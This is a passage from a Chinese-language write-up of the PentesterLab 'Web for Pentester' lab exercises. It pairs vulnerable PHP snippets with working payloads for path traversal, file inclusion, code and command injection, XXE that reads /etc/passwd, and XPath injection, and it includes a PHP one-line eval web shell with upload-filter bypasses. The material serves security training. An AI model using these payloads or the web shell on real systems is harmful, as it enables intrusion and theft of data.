-<p>使用%00截断后面字符串，读取passwd文件</p>
-<h4 id="Payload-17"><a href="#Payload-17" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</div></pre></td></tr></table></figure>
-<h2 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h2><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include($_GET[&quot;page&quot;]);</div></pre></td></tr></table></figure>
-<h4 id="Payload-18"><a href="#Payload-18" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php</div></pre></td></tr></table></figure>
-<p>读取intro.php文件</p>
-<h3 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$file = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$file);</div><div class="line">	include($file);</div></pre></td></tr></table></figure>
-<p>使用%00截断后面字符串</p>
-<h4 id="Payload-19"><a href="#Payload-19" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php%00</div></pre></td></tr></table></figure>
-<h2 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h2><h3 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&apos;name&apos;].&quot;!!!\&quot;;&quot;;  </div><div class="line">  </div><div class="line">  eval($str);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>使用了反斜杠【\】将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的<br>可以通过${${ }}这样的方式绕过，从而继续执行代码。</p>
-<h4 id="Payload-20"><a href="#Payload-20" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</div></pre></td></tr></table></figure>
-<h3 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">class User&#123;  </div><div class="line">  public $id, $name, $age;  </div><div class="line">  function __construct($id, $name, $age)&#123;  </div><div class="line">    $this-&gt;name= $name;  </div><div class="line">    $this-&gt;age = $age;  </div><div class="line">    $this-&gt;id = $id;  </div><div class="line">  &#125;     </div><div class="line">&#125;  </div><div class="line">  require_once(&apos;../header.php&apos;);  </div><div class="line">  require_once(&apos;../sqli/db.php&apos;);  </div><div class="line">    $sql = &quot;SELECT * FROM users &quot;;  </div><div class="line">  </div><div class="line">    $order = $_GET[&quot;order&quot;];  </div><div class="line">    $result = mysql_query($sql);  </div><div class="line">  if ($result) &#123;  </div><div class="line">        while ($row = mysql_fetch_assoc($result)) &#123;  </div><div class="line">      $users[] = new User($row[&apos;id&apos;],$row[&apos;name&apos;],$row[&apos;age&apos;]);  </div><div class="line">    &#125;  </div><div class="line">    if (isset($order))&lt;span style=&quot;color:#FF0000;&quot;&gt; &#123;   </div><div class="line">      usort($users, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));  </div><div class="line">    &#125;&lt;/span&gt;  </div><div class="line">    &#125;     </div><div class="line">  </div><div class="line">        ?&gt;  </div><div class="line">        &lt;table class=&apos;table table-striped&apos; &gt;  </div><div class="line">        &lt;tr&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;  </div><div class="line">        &lt;/tr&gt;  </div><div class="line">        &lt;?php  </div><div class="line">  </div><div class="line">    foreach ($users as $user) &#123;    </div><div class="line">            echo &quot;&lt;tr&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;id.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;name.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;age.&quot;&lt;/td&gt;&quot;;  </div><div class="line">            echo &quot;&lt;/tr&gt;&quot;;  </div><div class="line">        &#125;     </div><div class="line">        echo &quot;&lt;/table&gt;&quot;;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>create_function()的不当使用造成代码注入，可以这样构造);}phpinfo();//<br>执行我们的命令，);}是闭合了前面的代码，而//则是将后面的内容注释掉</p>
-<h4 id="Payload-21"><a href="#Payload-21" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example2.php?order=id);&#125;phpinfo();//</div></pre></td></tr></table></figure>
-<h3 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</p>
-<h4 id="Payload-22"><a href="#Payload-22" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example3.php?new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</div></pre></td></tr></table></figure>
-<h3 id="Example-4-2"><a href="#Example-4-2" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">  // ensure name is not empty   </div><div class="line">  assert(trim(&quot;&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;&quot;));  </div><div class="line">  echo &quot;Hello &quot;.htmlentities($_GET[&apos;name&apos;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>如此构造即可：hacker’.phpinfo().’</p>
-<h4 id="Payload-23"><a href="#Payload-23" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example4.php?name=hacker&apos;.phpinfo().&apos;</div></pre></td></tr></table></figure>
-<h2 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h2><h3 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h4 id="Payload-24"><a href="#Payload-24" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1|id</div></pre></td></tr></table></figure>
-<h3 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     die(&quot;Invalid IP address&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>正则表达式中有一个修饰符/m。它只检查一行，不关心下一行,此时我们可以利用%0a（换行符）绕过</p>
-<h4 id="Payload-25"><a href="#Payload-25" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0aid</div></pre></td></tr></table></figure>
-<h3 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>利用Location重定向到example3.php?ip=127.0.0.1，这里可以是用curl、burpsuite和nc查看回显</p>
-<h4 id="Payload-26"><a href="#Payload-26" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n&quot; | nc 192.168.56.101 80</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1|ls</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/pentesterlab1.png" alt=""></p>
-<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h3><p>直接上传一句话木马1.php。</p>
-<h4 id="Payload-27"><a href="#Payload-27" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata1.png" alt=""></p>
-<h3 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example 2"></a>Example 2</h3><p>直接上传一句话木马1.php。失败。</p>
-<p>把上传文件的文件名修改为1.php.aaaa<br>对于apache这样的服务器，碰到aaaa发现是不认识的文件名后缀，然后就会跳过这个文件名，解析下一个文件名。<br>成功上传</p>
-<p>根据php版本也可以尝试.php3,.php4,.php5此类后缀名进行上传。</p>
-<h4 id="Payload-28"><a href="#Payload-28" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php.aaaaa</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php3</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata2.png" alt=""></p>
-<h2 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h2><h3 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$xml=simplexml_load_string($_GET[&apos;xml&apos;]);</div><div class="line">	print_r((string)$xml);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>直接读取/etc/passwd</p>
-<h4 id="Payload-29"><a href="#Payload-29" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</div></pre></td></tr></table></figure>
-<p>Url编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</div></pre></td></tr></table></figure>
-<h3 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php require_once(&quot;../header.php&quot;);</div><div class="line"></div><div class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</div><div class="line"></div><div class="line">  $xml=simplexml_load_string($x);</div><div class="line">  $xpath = &quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</div><div class="line">  $res = ($xml-&gt;xpath($xpath));</div><div class="line">  while(list( ,$node) = each($res)) &#123;</div><div class="line">      echo $node;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h4 id="Payload-30"><a href="#Payload-30" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</div></pre></td></tr></table></figure>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="external">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="external">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="external">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="external">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="external">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="external">Web渗透测试攻略(下)</a></p>
 ]]></content>
     
     <summary type="html">
